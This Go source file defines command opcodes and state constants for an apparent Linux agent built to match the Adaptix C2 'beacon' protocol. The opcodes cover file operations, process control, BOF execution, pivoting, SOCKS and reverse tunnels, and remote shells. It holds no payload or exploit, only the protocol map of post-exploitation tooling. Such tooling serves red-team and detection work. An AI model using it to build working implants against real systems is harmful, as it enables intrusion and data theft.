package main

// ---------------------------------------------------------------------------
// Command opcodes.
//
// 0..74 and the 0x8xxx/0x1111xxxx values are byte-identical to the Adaptix
// "beacon" agent so that the session, task and GUI plumbing of the teamserver
// works unchanged. 100..107 are native Linux extensions implemented by this
// agent and its extender; they never collide with upstream opcodes.
// ---------------------------------------------------------------------------

const (
	cmdPwd           = 4
	cmdCd            = 8
	cmdTerm          = 10
	cmdCopy          = 12
	cmdLs            = 14
	cmdDisks         = 15
	cmdRm            = 17
	cmdMv            = 18
	cmdProfile       = 21
	cmdGetUID        = 22
	cmdRev2Self      = 23
	cmdCat           = 24
	cmdMkdir         = 27
	cmdDownload      = 32
	cmdUpload        = 33
	cmdDownloadState = 35
	cmdPivotExec     = 37
	cmdLink          = 38
	cmdUnlink        = 39
	cmdPsList        = 41
	cmdPsKill        = 42
	cmdPsRun         = 43
	cmdJobList       = 46
	cmdJobsKill      = 47
	cmdExecBof       = 50
	cmdExecBofOut    = 51

	cmdTunnelStartTCP = 62
	cmdTunnelStartUDP = 63
	cmdTunnelWriteTCP = 64
	cmdTunnelWriteUDP = 65
	cmdTunnelClose    = 66
	cmdTunnelReverse  = 67
	cmdTunnelAccept   = 68
	cmdTunnelPause    = 69
	cmdTunnelResume   = 70

	cmdShellStart  = 71
	cmdShellWrite  = 72
	cmdShellClose  = 73
	cmdShellAccept = 74

	cmdJob        = 0x8437
	cmdSaveMemory = 0x2321
	cmdError      = 0x1111ffff

	// Native Linux extension opcodes.
	cmdEnv      = 100
	cmdNetstat  = 101
	cmdIfconfig = 102
	cmdService  = 103
	cmdUname    = 104
	cmdChmod    = 105
	cmdUsers    = 106
	cmdSysinfo  = 107
)

const (
	downloadStart    = 0x1
	downloadContinue = 0x2
	downloadFinish   = 0x3

	downloadStateRunning  = 0x1
	downloadStateStopped  = 0x2
	downloadStateFinished = 0x3
	downloadStateCanceled = 0x4
)

const (
	jobTypeLocal   = 0x1
	jobTypeRemote  = 0x2
	jobTypeProcess = 0x3
	jobTypeShell   = 0x4
)

const (
	jobStateStarting = 0x0
	jobStateRunning  = 0x1
	jobStateFinished = 0x2
	jobStateKilled   = 0x3
)

const (
	tunnelTypeSocks4     = 1
	tunnelTypeSocks5     = 2
	tunnelTypeSOCKS5Auth = 3
	tunnelTypeLocalPort  = 4
	tunnelTypeReverse    = 5

	tunnelCreateSuccess = 0
	tunnelCreateError   = 1
	tunnelStateConnect  = 2

	tunnelBufferHighWatermark = 0x400000 // 4 MB, ask the server to pause
	tunnelBufferLowWatermark  = 0x100000 // 1 MB, ask the server to resume
	tunnelBufferHardCap       = 0x1000000
)
